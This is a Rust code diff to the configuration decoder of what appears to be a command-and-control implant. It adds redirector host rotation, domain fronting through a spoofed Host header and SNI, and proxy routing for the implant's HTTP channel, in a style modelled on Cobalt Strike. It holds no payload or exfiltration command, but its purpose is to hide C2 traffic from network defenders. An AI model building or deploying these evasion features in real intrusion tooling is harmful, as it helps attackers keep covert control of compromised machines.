@@ -46,6 +46,19 @@ pub struct Config {
     pub extc2_api_host: String,
     /// External C2 token (bot token / webhook secret). Empty = not configured.
     pub extc2_token: String,
+    // ---- HTTP channel enhancements (spec-7) ----
+    /// Comma-separated redirector hosts for host rotation (CS 4.10-style).
+    /// e.g. "cdn1.example.com,cdn2.example.com,cdn3.example.com". Empty = no
+    /// rotation, always use server_host directly.
+    pub rotation_hosts: String,
+    /// Domain-fronting Host header value. When non-empty, this is sent as the
+    /// HTTP `Host:` header (and SNI) while the TCP connection goes to
+    /// `server_host` (the fronting CDN's IP). Empty = no fronting.
+    pub fronting_host: String,
+    /// Explicit HTTP proxy in `host:port` format. Empty = use WinInet default
+    /// (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY). When set, WinHTTP routes through
+    /// this proxy.
+    pub proxy_server: String,
 }
 
 mod baked {
@@ -110,7 +123,8 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     // original fields. Old configs (build-time or unpatched .nyx_cfg) stop
     // after use_tls — `remaining()==0` → default to Https-only with empty
     // channel params. This is fully backward-compatible.
-    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token) =
+    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
+         rotation_hosts, fronting_host, proxy_server) =
         if r.remaining() > 0 {
             let primary_channel = r.u8().unwrap_or(0);
             let fallback_bitmap = r.u8().unwrap_or(0);
@@ -118,6 +132,16 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
             let smb_pipe_name = r.str().unwrap_or_default();
             let extc2_api_host = r.str().unwrap_or_default();
             let extc2_token = r.str().unwrap_or_default();
+            // spec-7 HTTP enhancement fields — further backward compat layer.
+            let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
+                (
+                    r.str().unwrap_or_default(),
+                    r.str().unwrap_or_default(),
+                    r.str().unwrap_or_default(),
+                )
+            } else {
+                (String::new(), String::new(), String::new())
+            };
             (
                 primary_channel,
                 fallback_bitmap,
@@ -125,9 +149,13 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
                 smb_pipe_name,
                 extc2_api_host,
                 extc2_token,
+                rotation_hosts,
+                fronting_host,
+                proxy_server,
             )
         } else {
-            (0, 0, String::new(), String::new(), String::new(), String::new())
+            (0, 0, String::new(), String::new(), String::new(), String::new(),
+             String::new(), String::new(), String::new())
         };
     Ok(Config {
         server_host,
@@ -143,5 +171,8 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
         smb_pipe_name,
         extc2_api_host,
         extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
     })
 }
